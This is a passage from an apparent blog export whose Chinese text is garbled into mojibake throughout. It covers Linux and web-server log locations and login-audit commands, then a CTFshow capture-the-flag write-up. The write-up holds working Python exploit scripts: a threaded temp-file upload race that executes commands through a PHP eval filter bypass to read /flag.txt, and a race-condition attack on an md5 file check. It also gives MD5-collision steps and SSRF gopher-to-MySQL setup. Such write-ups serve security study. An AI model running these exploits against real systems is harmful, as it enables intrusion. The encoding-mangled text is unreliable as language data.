-åŒ…å«ç”¨æˆ·ç™»å½•å¤±è´¥ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œé”™è¯¯ç™»å½•å‘½ä»¤ä¹Ÿä¼šè®°å½•åœ¨æœ¬æ–‡ä»¶ä¸­ã€‚&#x2F;var&#x2F;log&#x2F;kern.log â€“åŒ…å«å†…æ ¸äº§ç”Ÿçš„æ—¥å¿—ï¼Œæœ‰åŠ©äºåœ¨å®šåˆ¶å†…æ ¸æ—¶è§£å†³é—®é¢˜ã€‚&#x2F;var&#x2F;log&#x2F;lastlog â€”è®°å½•æ‰€æœ‰ç”¨æˆ·çš„æœ€è¿‘ä¿¡æ¯ã€‚è¿™ä¸æ˜¯ä¸€ä¸ªASCIIæ–‡ä»¶ï¼Œå› æ­¤éœ€è¦ç”¨lastlogå‘½ä»¤æŸ¥çœ‹å†…å®¹ã€‚&#x2F;var&#x2F;log&#x2F;faillog â€“åŒ…å«ç”¨æˆ·ç™»å½•å¤±è´¥ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œé”™è¯¯ç™»å½•å‘½ä»¤ä¹Ÿä¼šè®°å½•åœ¨æœ¬æ–‡ä»¶ä¸­ã€‚&#x2F;var&#x2F;log&#x2F;mail&#x2F; â€“ è¿™ä¸ªå­ç›®å½•åŒ…å«é‚®ä»¶æœåŠ¡å™¨çš„é¢å¤–æ—¥å¿—ã€‚&#x2F;var&#x2F;log&#x2F;samba&#x2F; â€“åŒ…å«ç”±sambaå­˜å‚¨çš„ä¿¡æ¯ã€‚&#x2F;var&#x2F;log&#x2F;wtmp â€”åŒ…å«ç™»å½•ä¿¡æ¯ã€‚ä½¿ç”¨wtmpå¯ä»¥æ‰¾å‡ºè°æ­£åœ¨ç™»é™†è¿›å…¥ç³»ç»Ÿï¼Œè°ä½¿ç”¨å‘½ä»¤æ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶æˆ–ä¿¡æ¯ç­‰ã€‚&#x2F;var&#x2F;log&#x2F;xorg.*.logâ€” æ¥è‡ªXçš„æ—¥å¿—ä¿¡æ¯ã€‚ æ—¥å¿—çš„ä¼˜å…ˆçº§åˆ« çº§åˆ« è‹±æ–‡å•è¯ ä¸­æ–‡é‡Šä¹‰ è¯´æ˜ 0 EMERG ç´§æ€¥ ä¼šå¯¼è‡´ä¸»æœºç³»ç»Ÿä¸å¯ç”¨çš„æƒ…å†µ 1 ALERT è­¦å‘Š å¿…é¡»é©¬ä¸Šé‡‡å–æªæ–½è§£å†³çš„é—®é¢˜ 2 CRIT ä¸¥é‡ æ¯”è¾ƒä¸¥é‡çš„æƒ…å†µ 3 ERR é”™è¯¯ è¿è¡Œå‡ºç°é”™è¯¯ 4 WARNING æé†’ å¯èƒ½å½±å“ç³»ç»ŸåŠŸèƒ½ï¼Œéœ€è¦æé†’ç”¨æˆ·çš„é‡è¦äº‹ä»¶ 5 NOTICE æ³¨æ„ ä¸ä¼šå½±å“æ­£å¸¸åŠŸèƒ½ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„äº‹ä»¶ 6 INFO ä¿¡æ¯ ä¸€èˆ¬ä¿¡æ¯ 7 DEBUG è°ƒè¯• ç¨‹åºæˆ–ç³»ç»Ÿè°ƒè¯•ä¿¡æ¯ç­‰ æ•°å­—ç­‰çº§è¶Šå°ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼Œæ¶ˆæ¯è¶Šé‡è¦ã€‚ ä¸‰ç§æ—¥å¿—ç±»å‹å†…æ ¸åŠç³»ç»Ÿæ—¥å¿—ï¼š è¿™ç§æ—¥å¿—æ•°æ®ç”±ç³»ç»ŸæœåŠ¡rsyslogç»Ÿä¸€ç®¡ç†ï¼Œæ ¹æ®å…¶ä¸»é…ç½®æ–‡ä»¶/etc/rsyslog.confä¸­çš„è®¾ç½®å†³å®šå°†å†…æ ¸æ¶ˆæ¯åŠå„ç§ç³»ç»Ÿç¨‹åºæ¶ˆæ¯è®°å½•åˆ°ä»€ä¹ˆä½ç½®ã€‚ç³»ç»Ÿä¸­æœ‰ç›¸å½“ä¸€éƒ¨åˆ†ç¨‹åºä¼šæŠŠè‡ªå·±çš„æ—¥å¿—æ–‡ä»¶äº¤ç”±rsyslogç®¡ç†ï¼Œå› è€Œè¿™äº›ç¨‹åºä½¿ç”¨çš„æ—¥å¿—è®°å½•ä¹Ÿå…·æœ‰ç›¸ä¼¼çš„æ ¼å¼ã€‚ ç”¨æˆ·æ—¥å¿—ï¼š è¿™ç§æ—¥å¿—æ•°æ®ç”¨äºè®°å½•Linuxæ“ä½œç³»ç»Ÿç”¨æˆ·ç™»å½•åŠé€€å‡ºç³»ç»Ÿçš„ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·åã€ç™»å½•çš„ç»ˆç«¯ã€ç™»å½•æ—¶é—´ã€æ¥æºä¸»æœºã€æ­£åœ¨ä½¿ç”¨çš„è¿›ç¨‹æ“ä½œç­‰ã€‚ ç¨‹åºæ—¥å¿—ï¼š æœ‰äº›åº”ç”¨ç¨‹åºä¼šé€‰æ‹©ç”±è‡ªå·±ç‹¬ç«‹ç®¡ç†ä¸€ä»½æ—¥å¿—æ–‡ä»¶ï¼ˆè€Œä¸æ˜¯äº¤ç»™rsyslogæœåŠ¡ç®¡ç†ï¼‰ï¼Œç”¨äºè®°å½•æœ¬ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­çš„å„ç§äº‹ä»¶ä¿¡æ¯ã€‚ç”±äºè¿™äº›ç¨‹åºåªè´Ÿè´£ç®¡ç†è‡ªå·±çš„æ—¥å¿—æ–‡ä»¶ï¼Œå› æ­¤ä¸åŒç¨‹åºæ‰€ä½¿ç”¨çš„æ—¥å¿—è®°å½•æ ¼å¼å¯èƒ½ä¼šå­˜åœ¨è¾ƒå¤§çš„å·®å¼‚ã€‚ ä¸€äº›å‘½ä»¤users userså‘½ä»¤åªæ˜¯ç®€å•åœ°è¾“å‡ºå½“å‰ç™»å½•çš„ç”¨æˆ·åç§°ï¼Œæ¯ä¸ªæ˜¾ç¤ºçš„ç”¨æˆ·åå¯¹åº”ä¸€ä¸ªç™»å½•ä¼šè¯ã€‚å¦‚æœä¸€ä¸ªç”¨æˆ·æœ‰ä¸æ­¢ä¸€ä¸ªç™»å½•ä¼šè¯ï¼Œé‚£ä»–çš„ç”¨æˆ·åå°†æ˜¾ç¤ºä¸å…¶ç›¸åŒçš„æ¬¡æ•°ã€‚ 12ubuntu@ubuntu-virtual-machine:~$ usersubuntu who whoå‘½ä»¤ç”¨äºæŠ¥å‘Šå½“å‰ç™»å½•åˆ°ç³»ç»Ÿä¸­çš„æ¯ä¸ªç”¨æˆ·çš„ä¿¡æ¯ã€‚ä½¿ç”¨è¯¥å‘½ä»¤ï¼Œç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥æŸ¥çœ‹å½“å‰ç³»ç»Ÿå­˜åœ¨å“ªäº›ä¸åˆæ³•ç”¨æˆ·ï¼Œä»è€Œå¯¹å…¶è¿›è¡Œå®¡è®¡å’Œå¤„ç†ã€‚whoçš„é»˜è®¤è¾“å‡ºåŒ…æ‹¬ç”¨æˆ·åã€ç»ˆç«¯ç±»å‹ã€ç™»å½•æ—¥æœŸåŠè¿œç¨‹ä¸»æœºã€‚ 12ubuntu@ubuntu-virtual-machine:~$ whoubuntu tty7 2020-02-03 03:50 (:0) w wå‘½ä»¤ç”¨äºæ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸­çš„æ¯ä¸ªç”¨æˆ·åŠå…¶æ‰€è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯ï¼Œæ¯”usersã€whoå‘½ä»¤çš„è¾“å‡ºå†…å®¹è¦ä¸°å¯Œä¸€äº›ã€‚ 12345root@MoonBack:~# w 14:26:21 up 86 days, 5:32, 2 users, load average: 0.02, 0.06, 0.02USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot pts/0 127.0.0.1 13:43 42:53 0.54s 0.02s -bashroot pts/1 127.0.0.1 14:22 0.00s 0.02s 0.00s w last lastå‘½ä»¤ç”¨äºæŸ¥è¯¢æˆåŠŸç™»å½•åˆ°ç³»ç»Ÿçš„ç”¨æˆ·è®°å½•ï¼Œæœ€è¿‘çš„ç™»å½•æƒ…å†µå°†æ˜¾ç¤ºåœ¨æœ€å‰é¢ã€‚é€šè¿‡lastå‘½ä»¤å¯ä»¥åŠæ—¶æŒæ¡Linuxä¸»æœºçš„ç™»å½•æƒ…å†µï¼Œè‹¥å‘ç°æœªç»æˆæƒçš„ç”¨æˆ·ç™»å½•è¿‡ï¼Œåˆ™è¡¨ç¤ºå½“å‰ä¸»æœºå¯èƒ½å·²è¢«å…¥ä¾µã€‚ 1234root@MoonBack:~# lastroot pts/1 127.0.0.1 Wed Feb 19 14:22 still logged inroot pts/1 127.0.0.1 Wed Feb 19 14:04 - 14:09 (00:04)root pts/0 127.0.0.1 Wed Feb 19 13:43 still logged in lastb lastbå‘½ä»¤ç”¨äºæŸ¥è¯¢ç™»å½•å¤±è´¥çš„ç”¨æˆ·è®°å½•ï¼Œå¦‚ç™»å½•çš„ç”¨æˆ·åé”™è¯¯ã€å¯†ç ä¸æ­£ç¡®ç­‰æƒ…å†µéƒ½å°†è®°å½•åœ¨æ¡ˆã€‚ç™»å½•å¤±è´¥çš„æƒ…å†µå±äºå®‰å…¨äº‹ä»¶ï¼Œå› ä¸ºè¿™è¡¨ç¤ºå¯èƒ½æœ‰äººåœ¨å°è¯•çŒœè§£ä½ çš„å¯†ç ã€‚ 1234567root@MoonBack:~# lastbuser ssh:notty 113.163.171.134 Wed Feb 19 05:39 - 05:39 (00:00)user ssh:notty 113.163.171.134 Wed Feb 19 05:39 - 05:39 (00:00)admin ssh:notty 14.169.178.174 Wed Feb 19 01:19 - 01:19 (00:00)admin ssh:notty 14.169.178.174 Wed Feb 19 01:19 - 01:19 (00:00)admin ssh:notty 14.169.178.174 Wed Feb 19 01:19 - 01:19 (00:00)admin ssh:notty 14.169.178.174 Wed Feb 19 01:19 - 01:19 (00:00) awk awkæ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬åˆ†æå·¥å…· 123last -n 5 | awk &#x27;&#123;print $1&#125;&#x27; #æ˜¾ç¤ºæœ€è¿‘ç™»é™†çš„5ä¸ªç”¨æˆ·,$1å®æŒ‡ä¼ è¿‡æ¥çš„ç¬¬ä¸€ä¸ªå‚æ•°awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; log | head -10 #å¯¹logæ–‡ä»¶ç”¨/åˆ†å‰²å–å‰10è¡Œçš„ç¬¬ä¸€åˆ—awk &#x27;&#123;print substr($1,5,5)&#125;&#x27; log | tail -10 #æˆªå–ç¬¬ä¸€åˆ—å10è¡Œä»ç¬¬äº”ä¸ªå­—ç¬¦å¼€å§‹çš„äº”ä¸ªå­—ç¬¦ webæ—¥å¿—IISæ—¥å¿—ä½ç½®IISçš„æ—¥å¿—æ–‡ä»¶é»˜è®¤ç›®å½•ä¸ºC:\\inetpub\\logs\\LogFilesï¼Œå¯é€šè¿‡Internet Information Services(IIS)ç®¡ç†å™¨æŸ¥çœ‹ï¼Œé»˜è®¤é‡‡ç”¨W3Cæ ¼å¼ Log Parser Studio éœ€è¦å…ˆå®‰è£…Log Parserä¸‹è½½åœ°å€ï¼šhttp://www.microsoft.com/en-us/download/details.aspx?displaylang=en&amp;id=24659 å®‰è£…Log Parser Studio ä¸‹è½½åœ°å€ï¼šhttp://gallery.technet.microsoft.com/Log-Parser-Studio-cd458765 å®‰è£…å®Œæˆç¬¬ä¸€ä¸ªæ–‡ä»¶ä¹‹åï¼Œè§£å‹ç¬¬äºŒä¸ªæ–‡ä»¶ï¼Œç›´æ¥è¿è¡ŒLPS.exeå³å¯ã€‚ æ–°å»ºä¸€ä¸ªæŸ¥è¯¢ å°†[LOGFILEPATH]æ›¿æ¢æˆæ—¥å¿—çš„è·¯å¾„ å°±å¯ä»¥å˜æˆç›´è§‚çš„è¡¨æ ¼å½¢å¼äº† å­—æ®µå‰ç¼€è¯´æ˜ï¼š å‰ç¼€ è¯´æ˜ s- æœåŠ¡å™¨æ“ä½œ c- å®¢æˆ·ç«¯æ“ä½œ cs- å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„æ“ä½œ sc- æœåŠ¡å™¨åˆ°å®¢æˆ·ç«¯çš„æ“ä½œ å„ä¸ªå­—æ®µè¯´æ˜ï¼š å­—æ®µ è¯´æ˜ date æ—¥æœŸï¼Œè¡¨ç¤ºæ´»åŠ¨å‘ç”Ÿçš„æ—¥æœŸã€‚ time æ—¶é—´ï¼Œè¡¨ç¤ºæ´»åŠ¨å‘ç”Ÿçš„æ—¶é—´ã€‚ s-sitename æœåŠ¡åï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯æ‰€è®¿é—®çš„è¯¥ç«™ç‚¹çš„ Internet æœåŠ¡å’Œå®ä¾‹çš„å·ç ã€‚ s-computername æœåŠ¡å™¨åï¼Œè¡¨ç¤ºç”Ÿæˆæ—¥å¿—é¡¹çš„æœåŠ¡å™¨åç§°ã€‚ s-ip æœåŠ¡å™¨IPï¼Œè¡¨ç¤ºç”Ÿæˆæ—¥å¿—é¡¹çš„æœåŠ¡å™¨çš„IPåœ°å€ã€‚ cs-method æ–¹æ³•ï¼Œä¾‹å¦‚GETæˆ–POSTã€‚ cs-uri-stem URIèµ„æºï¼Œè¡¨ç¤ºè¯·æ±‚è®¿é—®çš„åœ°å€ã€‚ cs-uri-query URIæŸ¥è¯¢ï¼Œè¡¨ç¤ºæŸ¥è¯¢HTTPè¯·æ±‚ä¸­é—®å·ï¼ˆ?ï¼‰åçš„ä¿¡æ¯ã€‚ s-port æœåŠ¡å™¨ç«¯å£ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯è¿æ¥çš„æœåŠ¡å™¨ç«¯å£å·ã€‚ cs-username é€šè¿‡éªŒè¯çš„åŸŸæˆ–ç”¨æˆ·åï¼Œå¯¹äºé€šè¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼Œæ ¼å¼æ˜¯åŸŸ\\ç”¨æˆ·åï¼›å¯¹äºåŒ¿åç”¨æˆ·ï¼Œæ˜¯ä¸€ä¸ªè¿å­—ç¬¦ (-)ã€‚ c-ip å®¢æˆ·ç«¯IPï¼Œè¡¨ç¤ºè®¿é—®æœåŠ¡å™¨çš„å®¢æˆ·ç«¯çœŸå®IP åœ°å€ã€‚ cs-version åè®®ç‰ˆæœ¬ï¼Œä¾‹å¦‚ HTTP 1.0 æˆ– HTTP 1.1ã€‚ user-agent ç”¨æˆ·ä»£ç†ï¼Œè¡¨ç¤ºåœ¨å®¢æˆ·ç«¯ä½¿ç”¨çš„æµè§ˆå™¨ã€‚ Cookie Cookieï¼Œè¡¨ç¤ºå‘é€æˆ–æ¥å—çš„Cookieå†…å®¹ï¼Œå¦‚æœæ²¡æœ‰Cookieï¼Œåˆ™æ˜¾ç¤ºè¿å­—ç¬¦ï¼ˆ-ï¼‰ã€‚ referer å¼•ç”¨ç«™ç‚¹ï¼Œè¡¨ç¤ºç”¨æˆ·è®¿é—®çš„å‰ä¸€ä¸ªç«™ç‚¹ã€‚æ­¤ç«™ç‚¹æä¾›åˆ°å½“å‰ç«™ç‚¹åˆ°é“¾æ¥ã€‚ cs-host ä¸»æœºï¼Œè¡¨ç¤ºä¸»æœºå¤´å†…å®¹ã€‚ sc-status åè®®è¿”å›çŠ¶æ€ï¼Œè¡¨ç¤ºHTTPæˆ–FTPçš„æ“ä½œçŠ¶æ€ã€‚ sc-substatus HTTPå­åè®®çš„çŠ¶æ€ã€‚ sc-win32-status win32çŠ¶æ€ï¼Œå³ç”¨ Windowsä½¿ç”¨çš„æœ¯è¯­è¡¨ç¤ºçš„æ“ä½œçš„çŠ¶æ€ã€‚ sc-bytes æœåŠ¡å™¨å‘é€å­—èŠ‚ã€‚ cs-bytes æœåŠ¡å™¨æ¥æ”¶å­—èŠ‚ã€‚ time-taken æ‰€ç”¨æ—¶é—´ï¼Œå³æ“ä½œæ‰€èŠ±æ—¶é—´é•¿çŸ­ï¼Œå•ä½ä¸ºæ¯«ç§’ã€‚ æ›´å¤šå†…å®¹å‚è§ï¼šhttps://www.alibabacloud.com/help/zh/doc-detail/84813.htm Apachelinuxæ—¥å¿—ä½ç½®å¦‚æœé‡‡ç”¨RPMåŒ…å®‰è£…ï¼Œé»˜è®¤æƒ…å†µä¸‹ç›®å½•/usr ç”¨æ¥å­˜æ”¾åº”ç”¨ç¨‹åºï¼Œç›®å½•/etc/apache2æˆ–è€…/etc/httpdå­˜æ”¾è½¯ä»¶çš„é…ç½®æ–‡ä»¶ å¦‚æœé‡‡ç”¨æºä»£ç å®‰è£…ï¼Œä¸€èˆ¬é»˜è®¤å®‰è£…åœ¨/usr/local/apache2ç›®å½•ä¸‹ æ‰¾ä¸åˆ°æˆ‘ä»¬å¯ä»¥ç”¨findå‘½ä»¤ 1find / -name apache2 è¿™é‡Œæˆ‘ç”¨dockeræ­å»ºçš„lampå‘ç°æ—¥å¿—æ–‡ä»¶ä½äº/var/log/apache2ç›®å½•ä¸‹ access.logè®°å½•ç€httpè¯·æ±‚ windowsæ—¥å¿—ä½ç½®å®‰è£…å®Œapacheåç›®å½•ç»“æ„ï¼š æ—¥å¿—æ–‡ä»¶ä½äºlogsç›®å½•ä¸‹ nginxlinuxæ—¥å¿—ä½ç½® ç”¨dockeræ‹‰å–å¾—nginxé•œåƒæ—¥å¿—æ–‡ä»¶ä½äº/var/log/nginxï¼Œé…ç½®æ–‡ä»¶ä½äº/etc/nginxï¼Œå¦‚æœä¸çŸ¥é“ä¹Ÿå¯ä»¥ä¹Ÿå¯ä»¥find windowsæ—¥å¿—ä½ç½®ç›®å½•ç»“æ„ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950â”‚ nginx.exeâ”‚â”œâ”€confâ”‚ example.confâ”‚ fastcgi.confâ”‚ fastcgi_paramsâ”‚ koi-utfâ”‚ koi-winâ”‚ mime.typesâ”‚ nconfig.confâ”‚ nginx.confâ”‚ scgi_paramsâ”‚ uwsgi_paramsâ”‚ vhosts.confâ”‚ win-utfâ”‚â”œâ”€contribâ”‚ â”‚ geo2nginx.plâ”‚ â”‚ READMEâ”‚ â”‚â”‚ â”œâ”€unicode2nginxâ”‚ â”‚ koi-utfâ”‚ â”‚ unicode-to-nginx.plâ”‚ â”‚ win-utfâ”‚ â”‚â”‚ â””â”€vimâ”‚ â”œâ”€ftdetectâ”‚ â”‚ nginx.vimâ”‚ â”‚â”‚ â”œâ”€indentâ”‚ â”‚ nginx.vimâ”‚ â”‚â”‚ â””â”€syntaxâ”‚ nginx.vimâ”‚â”œâ”€htmlâ”‚ 50x.htmlâ”‚ index.htmlâ”‚â”œâ”€logsâ”‚ access.logâ”‚ error.logâ”‚ nginx.pidâ”‚â””â”€temp â”œâ”€client_body_temp â”œâ”€fastcgi_temp â”œâ”€proxy_temp â”œâ”€scgi_temp â””â”€uwsgi_temp Tomcatå’Œä¸Šé¢çš„åŸºæœ¬ä¸€æ · å‚è€ƒï¼š https://www.freebuf.com/vuls/175560.html https://xz.aliyun.com/t/2524 https://www.cnblogs.com/llife/p/11478952.html https://www.alibabacloud.com/help/zh/doc-detail/84813.htm","categories":[],"tags":[{"name":"æ—¥å¿—","slug":"æ—¥å¿—","permalink":"http://www.m00nback.xyz/tags/%E6%97%A5%E5%BF%97/"}]},{"title":"CTFshowéƒ¨åˆ†é¢˜ç›®writeup","slug":"ctfshowéƒ¨åˆ†é¢˜ç›®writeup","date":"2020-02-17T14:02:49.000Z","updated":"2020-09-30T14:05:00.602Z","comments":true,"path":"2020/02/17/ctfshowéƒ¨åˆ†é¢˜ç›®writeup/","link":"","permalink":"http://www.m00nback.xyz/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ctfshowä¸Šéƒ¨åˆ†é¢˜ç›®çš„writeupï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ctfshowä¸Šéƒ¨åˆ†é¢˜ç›®çš„writeupï¼ çº¢åŒ…é¢˜çº¢åŒ…é¢˜ç¬¬äºŒå¼¹æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°hintï¼Œè®¿é—®å‘ç°ï¼š 12345678910111213&lt;?phpif(isset($_GET[&#x27;cmd&#x27;]))&#123; $cmd=$_GET[&#x27;cmd&#x27;]; highlight_file(__FILE__); if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123; die(&quot;cerror&quot;); &#125; if(preg_match(&quot;/\\~|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\ï¼ˆ|\\ï¼‰|\\-|\\_|\\&#123;|\\&#125;|\\[|\\]|\\&#x27;|\\&quot;|\\:|\\,/&quot;,$cmd))&#123; die(&quot;serror&quot;); &#125; eval($cmd);&#125;?&gt; æˆ‘ç¬¬ä¸€æ¬¡æƒ³åˆ°çš„æ˜¯phpæ­£åˆ™å›æº¯ï¼Œç„¶è€Œä¸æ˜¯ï¼Œä¸ç»•å¼¯å­ è¿‡æ»¤äº†å¥½å¤šä¸œè¥¿ï¼Œä½†å‘ç°./&lt;&gt;?pä»¥åŠåå¼•å·å¹¶æ²¡æœ‰è¿‡æ»¤ï¼Œè¿™é‡Œå°±è¦ä»‹ç»ä¸€ä¸ªæ¦‚å¿µphpä¸´æ—¶æ–‡ä»¶ æ–‡ä»¶è¢«ä¸Šä¼ åï¼Œé»˜è®¤ä¼šè¢«å­˜å‚¨åˆ°æœåŠ¡ç«¯çš„é»˜è®¤ä¸´æ—¶ç›®å½•ä¸­ï¼Œè¯¥ä¸´æ—¶ç›®å½•ç”±php.iniçš„upload_tmp_dirå±æ€§æŒ‡å®š åœ¨ä¸Šä¼ å­˜å‚¨åˆ°ä¸´æ—¶ç›®å½•åï¼Œä¸´æ—¶æ–‡ä»¶å‘½åçš„è§„åˆ™ï¼šé»˜è®¤ä¸º php+4æˆ–è€…6ä½éšæœºæ•°å­—å’Œå¤§å°å†™å­—æ¯ å› æ­¤æˆ‘ä»¬å°±å¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åç»•è¿‡ç”¨é€šé…ç¬¦å’ŒçŸ­æ ‡ç­¾æ¥æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œexp: 12345678910111213141516171819202122import requestsimport threadingurl1=&#x27;http://7653b365-217d-4cd7-91c9-e620b64e0638.challenges.ctf.show/?cmd=?&gt;&lt;?=`.+/???/p?p??????`;&#x27; #åŠ å·ç”¨æ¥åˆ†éš”ä¹Ÿå¯ä»¥ç”¨ç©ºæ ¼ï¼ŒçŸ­æ ‡ç­¾çš„ååŠéƒ¨åˆ†å¯ä»¥ä¸åŠ url=&#x27;http://7653b365-217d-4cd7-91c9-e620b64e0638.challenges.ctf.show/&#x27;proxies=&#123; &#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27; &#125;def post(): files=&#123; &#x27;upload&#x27;:&#x27;#!/bin/sh\\necho 1433223\\nls /\\ncat /flag.txt&#x27; &#125; r=requests.post(url,files=files)def req(): r=requests.get(url1) if &#x27;1433223&#x27; in r.text: print(r.text)for i in range(50): threading.Thread(target=post,args=()).start()for i in range(50): threading.Thread(target=req,args=()).start() çº¢åŒ…é¢˜ç¬¬å…­å¼¹hintæç¤ºä¸æ˜¯sqlæ³¨å…¥ï¼Œè¦æ‰¾æºç ï¼Œdirsearchæ‰«ç›®å½•å‘ç° www.zipé‡Œæœ‰check.phpçš„å…³é”®ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142function receiveStreamFile($receiveFile)&#123; $streamData = isset($GLOBALS[&#x27;HTTP_RAW_POST_DATA&#x27;])? $GLOBALS[&#x27;HTTP_RAW_POST_DATA&#x27;] : &#x27;&#x27;; if(empty($streamData))&#123; $streamData = file_get_contents(&#x27;php://input&#x27;); &#125; if($streamData!=&#x27;&#x27;)&#123; $ret = file_put_contents($receiveFile, $streamData, true); &#125;else&#123; $ret = false; &#125; return $ret; &#125;if(md5(date(&quot;i&quot;)) === $token)&#123; $receiveFile = &#x27;flag.dat&#x27;; receiveStreamFile($receiveFile); if(md5_file($receiveFile)===md5_file(&quot;key.dat&quot;))&#123; if(hash_file(&quot;sha512&quot;,$receiveFile)!=hash_file(&quot;sha512&quot;,&quot;key.dat&quot;))&#123; $ret[&#x27;success&#x27;]=&quot;1&quot;; $ret[&#x27;msg&#x27;]=&quot;äººè„¸è¯†åˆ«æˆåŠŸ!$flag&quot;; $ret[&#x27;error&#x27;]=&quot;0&quot;; echo json_encode($ret); return; &#125; $ret[&#x27;errormsg&#x27;]=&quot;same file&quot;; echo json_encode($ret); return; &#125; $ret[&#x27;errormsg&#x27;]=&quot;md5 error&quot;; echo json_encode($ret); return;&#125; $ret[&#x27;errormsg&#x27;]=&quot;token error&quot;;echo json_encode($ret);return; æŸ¥çœ‹key.datå‘ç°æ˜æ˜¾æ˜¯ç”¨fastcollç”Ÿæˆçš„ï¼Œä½†é¢˜ç›®å¹¶ä¸æ˜¯è¿™ç§æ€è·¯ ä»‹ç»ä¸€ä¸‹fastcollï¼Œå·¥å…·å¯ä»¥ç”¨æ¥ç”Ÿæˆä¸¤ä¸ªMD5å€¼ç›¸åŒä½†å†…å®¹ä¸ç›¸åŒçš„æ–‡ä»¶ 1fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt -p æ˜¯æºæ–‡ä»¶, -o æ˜¯è¾“å‡ºæ–‡ä»¶(ä¸¤ä¸ª)ï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨å·¥å…·ç”Ÿæˆå››ä¸ªMD5ç›¸åŒä½†å†…å®¹ä¸åŒçš„æ–‡ä»¶ å…ˆç”Ÿæˆä¸¤ä¸ªMD5ç›¸åŒä½†å†…å®¹ä¸åŒçš„æ–‡ä»¶ 1fastcoll_v1.0.0.5.exe -o 1.txt 2.txt å–å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶ä½œä¸ºæºæ–‡ä»¶å†ç”Ÿæˆä¸¤ä¸ªMD5ç›¸åŒä½†å†…å®¹ä¸åŒçš„æ–‡ä»¶ 1fastcoll_v1.0.0.5.exe -p 1.txt -o 3.txt 4.txt å¯ä»¥çœ‹åˆ°1.txt 2.txtæ˜¯128å­—èŠ‚ï¼Œè€Œ3.txt 4.txtæ˜¯256å­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å°†3.txt,4.txtæ–‡ä»¶å128å­—èŠ‚å–å‡ºæ¥æ”¾åœ¨2.txtåé¢ï¼Œä¾¿å¯ä»¥æœ‰å››ä¸ªMD5ç›¸åŒå†…å®¹ä¸ç›¸åŒçš„æ–‡ä»¶ å–å‡ºå¯ä»¥ç”¨tail,ä¸‹è½½è¿æ¥ï¼šhttps://www.trisunsoft.com/tail-for-windows.htm 12tail.exe -c 128 3.txt &gt; atail.exe -c 128 4.txt &gt; b åˆæˆå¯ç”¨winè‡ªå¸¦çš„type 12type 2.txt a &gt; 5.txttype 2.txt b &gt; 6.txt å½“ç„¶ä¹Ÿå¯ä»¥ç”¨hxd å†è¯´æœ¬é¢˜ ï¼Œé¢˜ç›®è€ƒå¯Ÿçš„æ˜¯æ¡ä»¶ç«äº‰ï¼Œå³æˆ‘ä»¬åªéœ€æ»¡è¶³ç¬¬ä¸€ä¸ªMD5æ¯”è¾ƒä¹‹åç„¶åæ›´æ”¹æ–‡ä»¶å†…å®¹å³å¯ï¼Œexp: 123456789101112131415161718192021222324import requestsimport timeimport hashlibimport threadingdef post(data): try: r=requests.post(url,data=data) if &quot;flag&quot; in r.text: print(r.text) except Exception as e: passmi=str(time.localtime().tm_min)m=hashlib.md5(mi.encode()).hexdigest()url=&#x27;http://124.156.121.112:28047/check.php?token=&#123;&#125;&amp;php://input&#x27;.format(m)with open(&#x27;key.dat&#x27;,&#x27;rb&#x27;) as f: data1=f.read()with open(&#x27;nokey.dat&#x27;,&#x27;rb&#x27;) as f: data2=f.read()for i in range(30): threading.Thread(target=post,args=(data1,)).start()for i in range(30): threading.Thread(target=post,args=(data2,)).start() å‚è€ƒï¼š https://xz.aliyun.com/t/2232 çº¢åŒ…é¢˜ç¬¬ä¹å¼¹å¾ˆæ˜æ˜¾æ˜¯ssrf gopher://åè®®æ”»å‡»mysqlï¼Œè¯•äº†å¾ˆä¹…ï¼Œéƒ½æ²¡æˆåŠŸï¼Œè¿˜æ˜¯tclï¼Œæœ€é‡è¦çš„urlç¼–ç å¿˜è®°äº†ï¼Œæˆ‘TM ä¸‹é¢ä»‹ç»ä¸‰ç§æ–¹å¼ç”Ÿæˆpayload: tcpdumpå‡†å¤‡å·¥ä½œï¼š mysqlè®¾ç½®æ— å¯†ç ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯kali2019.3 ç›´æ¥åœ¨é…ç½®æ–‡ä»¶/etc/mysql/mariadb.conf.d/50-server.cnfé‡Œçš„[mysqld]ä¸‹é¢å¢åŠ ä¸€è¡Œ 1skip-grant-tables é‡å¯mysql 1service mysql restart ä¸è¡Œå°± 12/usr/share/mysql/mysql.server stop/usr/share/mysql/mysql.server start /var/www/htmlæœ‰å†™æƒé™ï¼Œå…¶å®è¿™ä¸ªæ— æ‰€è°“ï¼ŒæŠ“çš„åªæ˜¯æµé‡ 1chmod 777 /var/www/html 